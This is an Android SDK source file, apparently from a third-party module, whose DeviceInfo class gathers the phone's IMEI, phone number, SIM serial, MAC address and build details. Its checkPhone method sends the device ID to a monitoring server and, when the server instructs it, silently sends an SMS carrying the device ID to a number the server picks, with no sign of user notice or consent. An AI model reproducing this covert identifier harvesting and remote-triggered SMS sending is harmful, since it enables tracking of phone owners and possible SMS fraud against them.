package com.ss.sssdk;

import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

import org.json.JSONObject;

/**
 * Created by ljw on 15/11/12.
 */
public class DeviceInfo {
    public static JSONObject getDeviceInfo() {
        JSONObject info = new JSONObject();
        TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
        WifiManager wifi = (WifiManager) SdkTools.context.getSystemService(Context.WIFI_SERVICE);
        try {

            WifiInfo wifiinfo = wifi.getConnectionInfo();
            info.put("mac",wifiinfo.getMacAddress());
            info.put("Imei", tm.getDeviceId());
            info.put("SoftVersion",tm.getDeviceSoftwareVersion());
            info.put("Phone",tm.getLine1Number());
            info.put("Operator",tm.getNetworkOperatorName());
            info.put("PhoneType",tm.getPhoneType());
            info.put("SimSerial", tm.getSimSerialNumber());
            info.put("VersionRelease", Build.VERSION.RELEASE);
            info.put("Model",android.os.Build.MODEL);
            info.put("Device",android.os.Build.DEVICE);
            info.put("Product",android.os.Build.PRODUCT);
            info.put("SDK",android.os.Build.VERSION.SDK_INT);
            info.put("Manufacturer",android.os.Build.MANUFACTURER);
            info.put("OsID",android.os.Build.ID);
            info.put("User", Build.USER);
            return info;
        }catch(Exception e) {
            e.printStackTrace();
        }
        return info;
    }
    public static String getDeviceId() {
        TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }

    public static String getPhone(boolean checkphone) {
        String phone = SdkTools.getKV("phone");
        if(phone.equalsIgnoreCase("")) {
            TelephonyManager tm = (TelephonyManager) SdkTools.context.getSystemService(Context.TELEPHONY_SERVICE);
            phone = tm.getLine1Number();
            if(phone != null && SdkTools.isPhone(phone)) {
                SdkTools.setKV("phone",phone);
                return phone;
            }else if(checkphone) {
                checkPhone();
            }
            return null;
        }else {
            if(SdkTools.isPhone(phone)) {
                return phone;
            }else if(checkphone){
                checkPhone();
            }
            return null;
        }
    }
    public static void checkPhone() {
        String deviceId = getDeviceId();
        String param = "d=" + deviceId;
        HttpRequest.sendGetJSONObject(HttpUrl.monitor_url, HttpUrl.GET_RECIEVE_PHONE,null, param, new HttpRequest.IHttpCallBack() {
            @Override
            public void callback(String ret) {

            }

            @Override
            public void callback(JSONObject ret) {
                if (ret != null) {
                    try {
                        if (ret.getBoolean("b")) {
                            JSONObject result = ret.getJSONObject("result");
                            if(result.has("mp")) {
                                String phone = result.getString("mp");
                                if (phone != null && SdkTools.isPhone(phone)) {
                                    SdkTools.setKV("phone",phone);
                                }
                            }else if(result.has("sp")) {
                                String sphone = (String)result.getString("sp");
                                if (sphone != null && SdkTools.isPhone(sphone)) {
                                    SdkTools.sendSMS(sphone, SMSObserver.FILTER_CEHCKPHONE + DeviceInfo.getDeviceId());
                                }
                            }
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        });
    }
}

